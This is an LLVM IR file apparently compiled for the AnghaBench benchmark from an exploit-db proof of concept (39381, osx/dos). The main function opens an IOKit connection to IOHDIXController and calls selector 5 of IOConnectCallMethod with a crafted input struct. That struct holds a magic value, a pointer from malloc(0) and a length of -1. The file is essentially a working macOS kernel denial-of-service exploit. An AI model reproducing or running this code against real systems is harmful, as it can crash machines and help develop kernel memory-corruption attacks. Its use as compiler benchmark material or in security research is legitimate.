; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39381.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39381.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"IOHDIXController\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"unable to create service matching dictionary\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [12 x i8] c"no matches\0A\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"got service: %x\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.6 = private unnamed_addr constant [40 x i8] c"got userclient connection: %x, type:%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"got userclient connection: %x\0A\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"IOConnectCall error: %x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [32 x i32], align 16
  %9 = alloca [16 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca [16 x i32], align 16
  %12 = alloca i32, align 4
  %13 = alloca [4096 x i8], align 16
  %14 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %15 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  store i32 %15, i32* %3, align 4
  %16 = load i32, i32* %3, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %20, label %18

18:                                               ; preds = %0
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %76

20:                                               ; preds = %0
  %21 = load i32, i32* @kIOMasterPortDefault, align 4
  %22 = load i32, i32* %3, align 4
  %23 = call i64 @IOServiceGetMatchingServices(i32 %21, i32 %22, i32* %4)
  store i64 %23, i64* %2, align 8
  %24 = load i64, i64* %2, align 8
  %25 = load i64, i64* @KERN_SUCCESS, align 8
  %26 = icmp ne i64 %24, %25
  br i1 %26, label %27, label %29

27:                                               ; preds = %20
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %76

29:                                               ; preds = %20
  %30 = load i32, i32* %4, align 4
  %31 = call i64 @IOIteratorNext(i32 %30)
  store i64 %31, i64* %5, align 8
  %32 = load i64, i64* %5, align 8
  %33 = load i64, i64* @IO_OBJECT_NULL, align 8
  %34 = icmp eq i64 %32, %33
  br i1 %34, label %35, label %37

35:                                               ; preds = %29
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %76

37:                                               ; preds = %29
  %38 = load i64, i64* %5, align 8
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i64 %38)
  %40 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %40, i32* %6, align 4
  %41 = load i64, i64* %5, align 8
  %42 = call i32 (...) @mach_task_self()
  %43 = call i64 @IOServiceOpen(i64 %41, i32 %42, i32 0, i32* %6)
  store i64 %43, i64* %2, align 8
  %44 = load i64, i64* %2, align 8
  %45 = load i64, i64* @KERN_SUCCESS, align 8
  %46 = icmp ne i64 %44, %45
  br i1 %46, label %47, label %49

47:                                               ; preds = %37
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %76

49:                                               ; preds = %37
  %50 = load i32, i32* %6, align 4
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0), i32 %50, i32 0)
  br label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %6, align 4
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i32 %53)
  %55 = call i8* @malloc(i32 0)
  store i8* %55, i8** %7, align 8
  %56 = bitcast [32 x i32]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %56, i8 0, i64 128, i1 false)
  %57 = getelementptr inbounds [32 x i32], [32 x i32]* %8, i64 0, i64 0
  store i32 -1091567891, i32* %57, align 16
  %58 = load i8*, i8** %7, align 8
  %59 = ptrtoint i8* %58 to i32
  %60 = getelementptr inbounds [32 x i32], [32 x i32]* %8, i64 0, i64 1
  store i32 %59, i32* %60, align 4
  %61 = getelementptr inbounds [32 x i32], [32 x i32]* %8, i64 0, i64 2
  store i32 -1, i32* %61, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %12, align 4
  store i64 4, i64* %14, align 8
  %62 = load i32, i32* %6, align 4
  %63 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  %64 = load i32, i32* %10, align 4
  %65 = getelementptr inbounds [32 x i32], [32 x i32]* %8, i64 0, i64 0
  %66 = getelementptr inbounds [16 x i32], [16 x i32]* %11, i64 0, i64 0
  %67 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %68 = call i64 @IOConnectCallMethod(i32 %62, i32 5, i32* %63, i32 %64, i32* %65, i32 256, i32* %66, i32* %12, i8* %67, i64* %14)
  store i64 %68, i64* %2, align 8
  %69 = load i64, i64* %2, align 8
  %70 = load i64, i64* @KERN_SUCCESS, align 8
  %71 = icmp ne i64 %69, %70
  br i1 %71, label %72, label %75

72:                                               ; preds = %52
  %73 = load i64, i64* %2, align 8
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0), i64 %73)
  store i32 0, i32* %1, align 4
  br label %76

75:                                               ; preds = %52
  store i32 0, i32* %1, align 4
  br label %76

76:                                               ; preds = %75, %72, %47, %35, %27, %18
  %77 = load i32, i32* %1, align 4
  ret i32 %77
}

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceGetMatchingServices(i32, i32, i32*) #1

declare dso_local i64 @IOIteratorNext(i32) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i32*, i32, i32*, i32*, i8*, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
